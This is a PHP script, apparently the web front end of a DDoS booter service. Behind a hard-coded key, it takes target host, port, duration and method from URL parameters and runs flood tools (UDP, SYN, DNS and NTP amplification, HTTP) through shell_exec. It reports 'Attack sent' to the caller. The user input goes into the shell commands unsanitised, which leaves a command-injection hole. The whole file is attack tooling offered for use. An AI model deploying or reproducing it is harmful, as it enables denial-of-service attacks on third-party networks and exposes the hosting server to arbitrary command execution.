<?php
// Coded by Sword

$key = $_GET['key'];
$host = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$method = $_GET['method'];

if ($key == "mdp") {
    if ($host == null) { echo "Please enter a host"; }
    elseif ($port == null) { echo "Please enter a port"; }
    elseif ($time == null) { echo "Please enter a time"; }
    elseif ($method == null) { echo "Please enter a method"; }
    else {
        if ($method == "UDP") {
            shell_exec("cd /home/kali/script/ && ./udp $host $port $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        if ($method == "SYN") { 
            shell_exec("cd /home/kali/script/ && ./syn $host $port $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        if ($method == "AMP-DNS") { 
            shell_exec("cd /home/kali/script/ && ./amp-dns $host dns.txt $port $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        if ($method == "AMP-NTP") { 
            shell_exec("cd /home/kali/script/ && ./amp-ntp $host ntp.txt $port $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        if ($method == "HTTP") { 
            shell_exec("cd /home/kali/script/ && ./http $host $port $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
    }
}
else { 
    echo "Key invalid !";
}


?>